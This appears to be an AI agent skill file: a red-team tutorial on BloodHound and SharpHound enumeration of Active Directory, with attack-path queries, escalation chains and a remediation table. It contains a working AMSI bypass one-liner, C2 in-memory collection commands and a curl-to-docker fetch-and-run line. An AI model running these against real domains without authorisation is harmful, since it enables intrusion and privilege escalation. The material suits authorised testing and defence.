---
name: performing-active-directory-bloodhound-analysis
description: Use BloodHound and SharpHound to enumerate Active Directory relationships and identify attack paths from compromised users to Domain Admin.
domain: cybersecurity
subdomain: red-teaming
tags: [bloodhound, active-directory, sharphound, attack-path, ad-enumeration, graph-theory, privilege-escalation]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing Active Directory BloodHound Analysis

## Overview

BloodHound is an open-source Active Directory reconnaissance tool that uses graph theory to reveal hidden relationships, attack paths, and privilege escalation opportunities within AD environments. By collecting data with SharpHound (or AzureHound for Azure AD), BloodHound visualizes how an attacker can escalate from a low-privilege user to Domain Admin through chains of misconfigurations, group memberships, ACL abuses, and trust relationships. MITRE ATT&CK classifies BloodHound as software S0521.

## Prerequisites

- Initial foothold on a domain-joined Windows system (or valid domain credentials)
- BloodHound CE (Community Edition) or BloodHound Legacy 4.x installed
- SharpHound collector (C# binary or PowerShell module)
- Neo4j database (Legacy) or PostgreSQL (CE)
- Network access to domain controllers (LDAP TCP/389, LDAPS TCP/636)

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1087.002 | Account Discovery: Domain Account | Discovery |
| T1069.002 | Permission Groups Discovery: Domain Groups | Discovery |
| T1018 | Remote System Discovery | Discovery |
| T1482 | Domain Trust Discovery | Discovery |
| T1615 | Group Policy Discovery | Discovery |
| T1069.001 | Permission Groups Discovery: Local Groups | Discovery |

## Step 1: Data Collection with SharpHound

### SharpHound.exe (Preferred for OPSEC)

```powershell
# Collect all data types (Users, Groups, Computers, Sessions, ACLs, Trusts, GPOs)
.\SharpHound.exe -c All --outputdirectory C:\Temp --zipfilename bloodhound_data.zip

# Stealth mode - collect only structure data (no session enumeration)
.\SharpHound.exe -c DCOnly --outputdirectory C:\Temp

# Collect with specific domain and credentials
.\SharpHound.exe -c All -d corp.local --ldapusername svc_enum --ldappassword Password123

# Loop collection - collect sessions over time for better coverage
.\SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:05:00

# Collect from Havoc C2 Demon session (in-memory)
dotnet inline-execute /tools/SharpHound.exe -c All --memcache --outputdirectory C:\Temp
```

### Invoke-BloodHound (PowerShell)

```powershell
# Import and run
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp -ZipFileName bh.zip

# AMSI bypass before loading (if needed)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### AzureHound (Azure AD)

```bash
# Collect Azure AD data
azurehound list -t <tenant-id> --refresh-token <token> -o azure_data.json

# Or using AzureHound PowerShell
Import-Module .\AzureHound.ps1
Invoke-AzureHound
```

## Step 2: Import Data into BloodHound

### BloodHound CE (v5+)

```bash
# Start BloodHound CE with Docker
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Access web interface at https://localhost:8080
# Default credentials: admin / bloodhound
# Upload ZIP file via GUI: Upload Data > Select File
```

### BloodHound Legacy

```bash
# Start Neo4j
sudo neo4j start
# Access Neo4j at http://localhost:7474 (default neo4j:neo4j)

# Start BloodHound GUI
./BloodHound --no-sandbox

# Drag and drop ZIP file into BloodHound GUI
```

## Step 3: Attack Path Analysis

### Pre-Built Queries (Most Critical)

```cypher
-- Find all Domain Admins
MATCH (n:Group) WHERE n.name =~ '(?i).*domain admins.*' RETURN n

-- Shortest path from owned user to Domain Admin
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p

-- Find Kerberoastable users with path to DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p

-- Find AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.displayname

-- Users with DCSync rights
MATCH p=(n1)-[:MemberOf|GetChanges*1..]->(u:Domain)
MATCH p2=(n1)-[:MemberOf|GetChangesAll*1..]->(u)
RETURN n1.name

-- Find computers where Domain Users are local admin
MATCH p=(m:Group {name:'DOMAIN USERS@CORP.LOCAL'})-[:AdminTo]->(c:Computer) RETURN p

-- Find unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

-- Find constrained delegation abuse paths
MATCH (u) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate

-- GPO abuse paths
MATCH p=(g:GPO)-[r:GpLink]->(ou:OU)-[r2:Contains*1..]->(c:Computer)
RETURN p LIMIT 50

-- Find all sessions on high-value targets
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {highvalue:true})
RETURN c.name, u.name, g.name
```

### Custom Cypher Queries

```cypher
-- Find users with GenericAll on other users (password reset path)
MATCH p=(u1:User)-[:GenericAll]->(u2:User) RETURN u1.name, u2.name

-- Find WriteDACL paths (ACL abuse)
MATCH p=(n)-[:WriteDacl]->(m) WHERE n<>m RETURN p LIMIT 50

-- Find AddMember rights to privileged groups
MATCH p=(n)-[:AddMember]->(g:Group {highvalue:true}) RETURN n.name, g.name

-- Map trust relationships
MATCH p=(d1:Domain)-[:TrustedBy]->(d2:Domain) RETURN d1.name, d2.name

-- Find service accounts with admin access
MATCH (u:User {hasspn:true})-[:AdminTo]->(c:Computer) RETURN u.name, c.name
```

## Step 4: Common Attack Paths

### Path 1: Kerberoasting to DA
```
User (owned) -> Kerberoastable SVC Account -> Crack Hash -> SVC is AdminTo Server ->
Server HasSession DA -> Steal Token -> Domain Admin
```

### Path 2: ACL Abuse Chain
```
User (owned) -> GenericAll on User2 -> Reset Password -> User2 MemberOf ->
IT Admins -> AdminTo DC -> Domain Admin
```

### Path 3: Unconstrained Delegation
```
User (owned) -> AdminTo Server (Unconstrained Delegation) ->
Coerce DC Auth (PrinterBug/PetitPotam) -> Capture TGT -> DCSync
```

### Path 4: GPO Abuse
```
User (owned) -> GenericWrite on GPO -> Modify GPO -> Scheduled Task on OU Computers ->
Code Execution as SYSTEM
```

## Step 5: Remediation Recommendations

| Finding | Risk | Remediation |
|---|---|---|
| Kerberoastable DA | Critical | Use gMSA, rotate passwords, AES-only |
| Unconstrained Delegation | Critical | Migrate to constrained/RBCD delegation |
| Domain Users local admin | High | Remove DA from local admin, use LAPS |
| Excessive ACL permissions | High | Audit and reduce GenericAll/WriteDACL |
| Stale admin sessions | Medium | Implement session cleanup, restrict RDP |
| Cross-domain trust abuse | High | Review trust direction and SID filtering |

## References

- BloodHound GitHub: https://github.com/BloodHoundAD/BloodHound
- BloodHound CE: https://github.com/SpecterOps/BloodHound
- SharpHound: https://github.com/BloodHoundAD/SharpHound
- MITRE ATT&CK S0521: https://attack.mitre.org/software/S0521/
- SpecterOps BloodHound Documentation: https://bloodhound.readthedocs.io/
